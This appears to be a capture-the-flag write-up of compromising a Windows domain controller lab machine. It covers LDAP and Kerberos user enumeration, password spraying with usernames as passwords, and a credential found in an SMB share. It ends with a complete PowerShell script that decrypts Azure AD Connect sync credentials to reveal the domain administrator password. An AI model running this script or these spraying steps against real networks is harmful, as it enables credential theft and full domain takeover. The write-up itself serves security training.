![image](https://github.com/user-attachments/assets/ba4c55d7-2b31-4e8a-be6a-fc623f8a7c96)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Enumeration:

I began the enumeration process by scanning for open ports and services using `rustscan`:

```
rustscan -a 10.10.10.172 -- -A -T4 -vv -oN mont_nmap
```

The scan revealed multiple open ports on the target environment:

![image](https://github.com/user-attachments/assets/23633370-a6f3-4a9b-8d41-72306e6e740f)

```R
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-08-27 07:08:20Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=8/27%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=66CD7BC9%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=108%TI=I%II=I%SS=O%TS=U)
SEQ(SP=105%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=U)
OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-27T07:09:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

From the port scan results, I observed a domain, `MEGABANK.LOCAL`, which I added to my hosts configuration file.

## Kerbreoas enumeration:

Since port 88 was open and running, I started by finding valid usernames using a common username list and a tool called `kerbrute`:

```
kerbrute userenum --dc MEGABANK.LOCAL -d MEGABANK.LOCAL /usr/share/SecLists/Usernames/cirt-default-usernames.txt
```

Although this list contained 828 different usernames, it only identified the Administrator user on the target host.

![image](https://github.com/user-attachments/assets/e78c7e7b-27fb-4c4d-99ac-514d91373292)

## RPC enumeration:

Next, I attempted to enumerate using RPC with NULL authentication. However, this method didn’t work, indicating that NULL authentication is not allowed on this host.

![image](https://github.com/user-attachments/assets/8e9a37ec-b00e-4262-b86b-45dd2d903d3f)

## LDAP enumeration:

Moving ahead, since port 389 was open and running, I performed LDAP enumeration using the `ldapsearch` tool:

```
ldapsearch -x -H ldap://MEGABANK.LOCAL -s base namingcontexts
```

![image](https://github.com/user-attachments/assets/b91286e8-81b2-41b4-9dcc-38e4818f2025)

Further enumeration using LDAP search to explore details of the domain controller (DC) yielded a large set of results:

```
ldapsearch -x -H ldap://MEGABANK.LOCAL -b 'dc=MEGABANK,dc=LOCAL
```

![image](https://github.com/user-attachments/assets/22c1a319-c03c-458a-8022-d2389b688716)
![image](https://github.com/user-attachments/assets/42d79949-0017-47cc-9d57-3b57a8f2a06f)

Since the data was extensive, I used grep to extract relevant information:

```
ldapsearch -x -H ldap://MEGABANK.LOCAL -b 'dc=MEGABANK,dc=LOCAL' | grep 'sAMAccountName:'  #to grep sam account name
ldapsearch -x -H ldap://MEGABANK.LOCAL -b 'dc=MEGABANK,dc=LOCAL' '(ObjectClass=Person)'| grep 'sAMAccountName:'  #to grep sam account name from the person object class
ldapsearch -x -H ldap://MEGABANK.LOCAL -b 'dc=MEGABANK,dc=LOCAL' '(ObjectClass=Person)'| grep -i "distinguishedName:"  #to grep dustinguish names
```

![image](https://github.com/user-attachments/assets/082e3f99-92f0-493c-9ce4-40ff23033957)

With the LDAP search, I found some valid usernames and created a list of these valid users.

## SMB enumeration:

Next, I began SMB enumeration using the valid set of accounts collected from LDAP enumeration. I started by checking the password policy with null authentication, using a tool called `NetExec`. The results showed that there is no account lockout policy:

```
nxc smb MEGABANK.LOCAL -u "" -p "" --pass-pol
```

![image](https://github.com/user-attachments/assets/91ba8238-5f4e-4d0d-8163-6f6619144cd1)

Since I had valid usernames but not valid passwords, I began searching for valid passwords. Given that there is no account lockout policy, I attempted brute force using a common password list, but this approach didn't work:

![image](https://github.com/user-attachments/assets/a38f2dc0-3058-4467-90b6-02f584290fad)

Next, I tried using the username as the password for authentication, which finally worked for one of the accounts. 🙂

![image](https://github.com/user-attachments/assets/275222a7-8ba0-45c3-92d9-d27b8eb23a2f)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Initial access:

With the valid credentials, I attempted to log in using WINRM, but the user did not have permissions for WINRM login. So, I checked the access for SMB file shares and found that the user had access to SMB shares:

![image](https://github.com/user-attachments/assets/3418bc1a-d52f-4e30-8855-22751bff2c8b)

I connected to this share using `smbclient-ng` and enumerated all the available directories. In the `users$` directory, I found an "**azure.xml**" file, which I downloaded to my local host.

![image](https://github.com/user-attachments/assets/c5d27ab8-9c6c-486a-9e35-c1f11849d317)

Upon checking the file content, I found a password inside this XML file:

![image](https://github.com/user-attachments/assets/5023ca1e-6400-4f4a-b3bf-fd5ff930136a)

I then sprayed these credentials across the valid usernames and found a correct match:

![image](https://github.com/user-attachments/assets/aec3652c-b590-4fce-ac69-22015ae00863)

Using the newly found credentials, I was finally able to log into the target host and retrieve the user flag. 🙂

![image](https://github.com/user-attachments/assets/77eff294-b898-487c-8881-4391f285fbc2)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Root.txt:

To retrieve the root flag, I began looking for ways to escalate my privileges. I checked my current privileges using `whoami /all` and noticed that I had a unique privilege: `Azure Admins`.

![image](https://github.com/user-attachments/assets/f12109ea-501d-4e40-8cd1-a44671da143f)

I started researching potential exploits and came across a blog post: [Azure AD Connect for RedTeam](https://blog.xpnsec.com/azuread-connect-for-redteam/). This post explains how Azure Admin access can be leveraged to retrieve credentials from the credential manager used for Azure AD Sync.

The blog provided a proof of concept (POC) with a [PowerShell script](https://gist.githubusercontent.com/xpn/0dc393e944d8733e3c63023968583545/raw/d45633c954ee3d40be1bff82648750f516cd3b80/azuread_decrypt_msol.ps1). However, the POC didn’t work as expected. After further research and some hints, I realized it was pointing towards localdb. I modified the script to include a connection string pointing to the localhost. Below is the updated script after the changes:

```ps1
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server = 127.0.0.1; Database = ADSync;Initial Catalog=ADSync;Integrated Security = True;"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

I transferred the modified POC script to the target host and executed it. Shortly after running the script, I successfully retrieved the administrator's password.

![image](https://github.com/user-attachments/assets/9424f1a8-254f-45e7-8a62-587fdae95fd4)

Using these credentials, I logged in as the Administrator and retrieved the root flag. (pwn3d! 🎉)

![image](https://github.com/user-attachments/assets/a1da3f63-4b5f-4fc8-8b12-51ad66ee7c47)
